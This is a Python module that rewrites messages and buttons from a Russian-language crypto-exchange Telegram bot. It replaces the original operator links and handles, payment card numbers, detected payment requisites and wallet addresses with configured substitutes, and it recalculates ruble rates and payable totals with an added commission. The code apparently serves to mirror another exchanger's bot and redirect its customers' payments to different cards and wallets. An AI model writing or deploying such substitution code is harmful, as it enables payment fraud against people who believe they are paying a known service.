from __future__ import annotations

import copy
import re
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlparse

CARD_RE = re.compile(r"\b\d{4}(?:[ \-]?\d{4}){3}\b")
RATE_LINE_HINTS = ("курс покупки", "курс продажи", "по курсу")
PAYMENT_LINE_HINTS = ("к оплате", "с учетом скидки")
MONEY_RUB_RE = re.compile(r"([0-9][0-9 .,]*[0-9])(\s*руб\.?)", re.IGNORECASE)


@dataclass(frozen=True)
class RuntimeOverrides:
    operator_url: str
    payment_requisites: str
    link_overrides: dict[str, str] = field(default_factory=dict)
    sell_wallet_overrides: dict[str, str] = field(default_factory=dict)
    commission_percent: float = 0.0


def normalize_operator_url(value: str) -> str:
    raw = (value or "").strip()
    if not raw:
        return ""
    if raw.startswith("@"):  # @username
        return f"https://t.me/{raw[1:]}"
    if raw.startswith("t.me/"):
        return f"https://{raw}"
    parsed = urlparse(raw)
    if parsed.scheme and parsed.netloc:
        return raw.rstrip("/")
    return raw.rstrip("/")


def extract_operator_handle(url: str) -> str:
    parsed = urlparse((url or "").strip())
    host = (parsed.netloc or "").lower()
    if host.startswith("www."):
        host = host[4:]
    if host not in {"t.me", "telegram.me"}:
        return ""
    path = (parsed.path or "").strip("/")
    if not path:
        return ""
    return path.split("/")[0]


def apply_state_overrides(
    *,
    state: dict[str, Any],
    overrides: RuntimeOverrides,
    operator_url_aliases: tuple[str, ...],
    operator_handle_aliases: tuple[str, ...],
    detected_requisites: tuple[str, ...],
    link_url_aliases: dict[str, tuple[str, ...]] | None = None,
    sell_wallet_aliases: dict[str, tuple[str, ...]] | None = None,
    live_rates_rub: dict[str, float] | None = None,
) -> dict[str, Any]:
    updated = copy.deepcopy(state)

    target_operator_url = normalize_operator_url(overrides.operator_url)
    target_operator_handle = extract_operator_handle(target_operator_url).lower()

    for text_field in ("text", "text_html", "text_markdown"):
        raw_value = updated.get(text_field)
        if not isinstance(raw_value, str) or not raw_value:
            continue
        value = raw_value

        if target_operator_url:
            value = _replace_operator_urls(value, operator_url_aliases, target_operator_url)
            if target_operator_handle:
                value = _replace_operator_handles(value, operator_handle_aliases, target_operator_handle)

        if overrides.link_overrides and link_url_aliases:
            value = _replace_link_urls(
                value,
                link_overrides=overrides.link_overrides,
                link_url_aliases=link_url_aliases,
                skip_keys={"operator"},
            )

        if overrides.sell_wallet_overrides and sell_wallet_aliases:
            value = _replace_sell_wallets(
                value,
                sell_wallet_overrides=overrides.sell_wallet_overrides,
                sell_wallet_aliases=sell_wallet_aliases,
            )

        if overrides.payment_requisites.strip():
            value = _replace_requisites(
                value,
                replacement=overrides.payment_requisites.strip(),
                detected_requisites=detected_requisites,
            )

        if live_rates_rub:
            value = _replace_live_rates(value, live_rates_rub, overrides.commission_percent)

        updated[text_field] = value

    text_links = updated.get("text_links")
    if isinstance(text_links, list):
        patched_links: list[Any] = []
        for link in text_links:
            if not isinstance(link, str):
                patched_links.append(link)
                continue

            patched = link
            if target_operator_url and _is_same_url(link, operator_url_aliases):
                patched = target_operator_url
            elif overrides.link_overrides and link_url_aliases:
                patched = _replace_single_link_url(
                    link,
                    link_overrides=overrides.link_overrides,
                    link_url_aliases=link_url_aliases,
                    skip_keys={"operator"},
                )
            patched_links.append(patched)
        updated["text_links"] = patched_links

    _patch_buttons(
        updated,
        target_operator_url=target_operator_url,
        target_operator_handle=target_operator_handle,
        operator_url_aliases=operator_url_aliases,
        operator_handle_aliases=operator_handle_aliases,
        link_overrides=overrides.link_overrides,
        link_url_aliases=link_url_aliases or {},
        sell_wallet_overrides=overrides.sell_wallet_overrides,
        sell_wallet_aliases=sell_wallet_aliases or {},
        requisites_value=overrides.payment_requisites.strip(),
        detected_requisites=detected_requisites,
    )

    return updated


def _replace_live_rates(
    text: str,
    rates_rub: dict[str, float],
    commission_percent: float = 0.0,
) -> str:
    multipliers: list[float] = []
    out_lines: list[str] = []

    for line in text.splitlines():
        normalized = line.lower()
        if not any(hint in normalized for hint in RATE_LINE_HINTS):
            out_lines.append(line)
            continue

        symbol = _symbol_from_rate_asset(line)
        if not symbol:
            out_lines.append(line)
            continue
        value = rates_rub.get(symbol)
        if value is None:
            out_lines.append(line)
            continue

        adjusted_for_totals = _apply_commission(value, line, commission_percent)

        def repl_rate(match: re.Match[str]) -> str:
            old_token = match.group(1)
            suffix = match.group(2)
            old_value = _parse_money_value(old_token)
            if old_value and old_value > 0:
                multipliers.append(adjusted_for_totals / old_value)
            return f"{_format_rub(value)}{suffix}"

        out_lines.append(MONEY_RUB_RE.sub(repl_rate, line, count=1))

    updated = "\n".join(out_lines)
    if multipliers:
        updated = _replace_payment_amounts(updated, multipliers[0])
    return updated


def _apply_commission(rate_rub: float, prefix: str, commission_percent: float) -> float:
    fee = max(float(commission_percent), 0.0)
    factor = fee / 100.0
    normalized_prefix = (prefix or "").lower()
    if "курс покупки" in normalized_prefix or ("покупка" in normalized_prefix and "по курсу" in normalized_prefix):
        return rate_rub * (1.0 + factor)
    if "курс продажи" in normalized_prefix:
        return rate_rub * (1.0 - factor)
    return rate_rub


def _replace_payment_amounts(text: str, multiplier: float) -> str:
    if multiplier <= 0:
        return text

    lines = text.splitlines()
    out_lines: list[str] = []
    for line in lines:
        normalized = line.lower()
        if not any(hint in normalized for hint in PAYMENT_LINE_HINTS):
            out_lines.append(line)
            continue

        def repl_money(match: re.Match[str]) -> str:
            old_token = match.group(1)
            suffix = match.group(2)
            old_value = _parse_money_value(old_token)
            if old_value is None:
                return match.group(0)
            new_value = old_value * multiplier
            return f"{_format_like_source(new_value, old_token)}{suffix}"

        out_lines.append(MONEY_RUB_RE.sub(repl_money, line, count=1))
    return "\n".join(out_lines)


def _parse_money_value(token: str) -> float | None:
    cleaned = (token or "").replace("\u00a0", " ").replace(" ", "")
    if "." in cleaned and "," in cleaned:
        if cleaned.rfind(".") > cleaned.rfind(","):
            cleaned = cleaned.replace(",", "")
        else:
            cleaned = cleaned.replace(".", "").replace(",", ".")
    else:
        cleaned = cleaned.replace(",", ".")
    cleaned = re.sub(r"[^0-9.]", "", cleaned)
    if not cleaned or cleaned.count(".") > 1:
        return None
    try:
        return float(cleaned)
    except ValueError:
        return None

def _format_like_source(value: float, source_token: str) -> str:
    token = source_token or ""
    token_clean = token.replace("\u00a0", " ")
    sep = "." if "." in token_clean else ("," if "," in token_clean else "")
    decimals = 0
    if sep:
        decimals = len(token_clean.rsplit(sep, 1)[-1])

    if decimals <= 0:
        return f"{round(value):,}".replace(",", " ")

    rendered = f"{value:,.{decimals}f}".replace(",", " ")
    if sep == ",":
        rendered = rendered.replace(".", ",")
    return rendered


def _symbol_from_rate_asset(asset: str) -> str | None:
    text = (asset or "").lower()
    if "usdt" in text or "tether" in text:
        return "USDT"
    if "litecoin" in text or "ltc" in text:
        return "LTC"
    if "bitcoin" in text or "btc" in text:
        return "BTC"
    if "ethereum" in text or "eth" in text:
        return "ETH"
    if "monero" in text or "xmr" in text:
        return "XMR"
    if "tron" in text or "trx" in text:
        return "TRX"
    if "ton" in text:
        return "TON"
    return None


def _format_rub(value: float) -> str:
    return f"{round(value):,}".replace(",", " ")


def _replace_operator_urls(text: str, aliases: tuple[str, ...], target_url: str) -> str:
    value = text
    for alias in aliases:
        if not alias:
            continue
        value = value.replace(alias, target_url)
        alt = alias.replace("https://", "http://")
        value = value.replace(alt, target_url)
    return value


def _replace_operator_handles(text: str, aliases: tuple[str, ...], target_handle: str) -> str:
    value = text
    for alias in aliases:
        if not alias:
            continue
        pattern = re.compile(rf"@{re.escape(alias)}\b", re.IGNORECASE)
        value = pattern.sub(f"@{target_handle}", value)
    return value


def _replace_link_urls(
    text: str,
    *,
    link_overrides: dict[str, str],
    link_url_aliases: dict[str, tuple[str, ...]],
    skip_keys: set[str],
) -> str:
    value = text
    for key, replacement in link_overrides.items():
        target = normalize_operator_url(replacement)
        if not target or key in skip_keys:
            continue
        for alias in link_url_aliases.get(key, ()):
            if not alias:
                continue
            value = value.replace(alias, target)
            alt = alias.replace("https://", "http://")
            value = value.replace(alt, target)
    return value


def _replace_single_link_url(
    url: str,
    *,
    link_overrides: dict[str, str],
    link_url_aliases: dict[str, tuple[str, ...]],
    skip_keys: set[str],
) -> str:
    for key, replacement in link_overrides.items():
        target = normalize_operator_url(replacement)
        if not target or key in skip_keys:
            continue
        aliases = link_url_aliases.get(key, ())
        if _is_same_url(url, aliases):
            return target
    return url


def _replace_sell_wallets(
    text: str,
    *,
    sell_wallet_overrides: dict[str, str],
    sell_wallet_aliases: dict[str, tuple[str, ...]],
) -> str:
    value = text
    for key, replacement in sell_wallet_overrides.items():
        wallet = (replacement or "").strip()
        if not wallet:
            continue
        for alias in sell_wallet_aliases.get(key, ()):
            if not alias:
                continue
            value = value.replace(alias, wallet)
    return value


def _replace_requisites(text: str, *, replacement: str, detected_requisites: tuple[str, ...]) -> str:
    value = text
    for old in detected_requisites:
        if old:
            value = value.replace(old, replacement)
    value = CARD_RE.sub(replacement, value)
    value = re.sub(r"(?<=\d)\{\}", "", value)
    return value


def _patch_buttons(
    state: dict[str, Any],
    *,
    target_operator_url: str,
    target_operator_handle: str,
    operator_url_aliases: tuple[str, ...],
    operator_handle_aliases: tuple[str, ...],
    link_overrides: dict[str, str],
    link_url_aliases: dict[str, tuple[str, ...]],
    sell_wallet_overrides: dict[str, str],
    sell_wallet_aliases: dict[str, tuple[str, ...]],
    requisites_value: str,
    detected_requisites: tuple[str, ...],
) -> None:
    def patch_button(btn: dict[str, Any]) -> None:
        url = str(btn.get("url") or "")
        if target_operator_url:
            if url and _is_same_url(url, operator_url_aliases):
                btn["url"] = target_operator_url
                url = target_operator_url
        if url and link_overrides and link_url_aliases:
            btn["url"] = _replace_single_link_url(
                url,
                link_overrides=link_overrides,
                link_url_aliases=link_url_aliases,
                skip_keys={"operator"},
            )

        text = btn.get("text")
        if isinstance(text, str) and text:
            value = text
            if target_operator_handle:
                value = _replace_operator_handles(value, operator_handle_aliases, target_operator_handle)
            if sell_wallet_overrides and sell_wallet_aliases:
                value = _replace_sell_wallets(
                    value,
                    sell_wallet_overrides=sell_wallet_overrides,
                    sell_wallet_aliases=sell_wallet_aliases,
                )
            if requisites_value:
                value = _replace_requisites(
                    value,
                    replacement=requisites_value,
                    detected_requisites=detected_requisites,
                )
            btn["text"] = value

    rows = state.get("button_rows")
    if isinstance(rows, list):
        for row in rows:
            if not isinstance(row, list):
                continue
            for btn in row:
                if isinstance(btn, dict):
                    patch_button(btn)

    buttons = state.get("buttons")
    if isinstance(buttons, list):
        for btn in buttons:
            if isinstance(btn, dict):
                patch_button(btn)


def _normalize_url(value: str) -> str:
    raw = (value or "").strip().rstrip("/")
    if not raw:
        return ""
    return raw


def _is_same_url(url: str, aliases: tuple[str, ...]) -> bool:
    normalized = _normalize_url(url)
    if not normalized:
        return False
    if normalized in {_normalize_url(alias) for alias in aliases if alias}:
        return True

    normalized_alt = normalized.replace("http://", "https://")
    alias_set_alt = {
        _normalize_url(alias).replace("http://", "https://")
        for alias in aliases
        if alias
    }
    return normalized_alt in alias_set_alt
